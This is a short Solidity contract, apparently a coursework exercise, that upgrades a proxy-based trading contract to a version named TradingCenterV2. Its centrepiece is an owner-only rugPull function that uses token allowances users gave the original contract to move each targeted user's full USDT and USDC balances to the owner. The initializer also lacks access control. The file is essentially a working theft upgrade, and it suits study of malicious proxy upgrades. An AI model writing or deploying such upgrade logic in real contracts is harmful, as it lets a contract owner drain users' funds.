// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {Proxy} from "./Proxy.sol";
import {TradingCenter} from "./TradingCenter.sol";
import {Ownable} from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable{
    bool public v2Initialized;

    function v2Initialize() external {
        require(!v2Initialized, "already initialized");
        v2Initialized = true;
    }

    function rugPull(address _beRugPullOwner) external onlyOwner {
        usdt.transferFrom(_beRugPullOwner, getOwner(), usdt.balanceOf(_beRugPullOwner));
        usdc.transferFrom(_beRugPullOwner, getOwner(), usdc.balanceOf(_beRugPullOwner));
    }

    function VERSION() external view virtual override returns (string memory) {
        return "0.0.2";
    }
}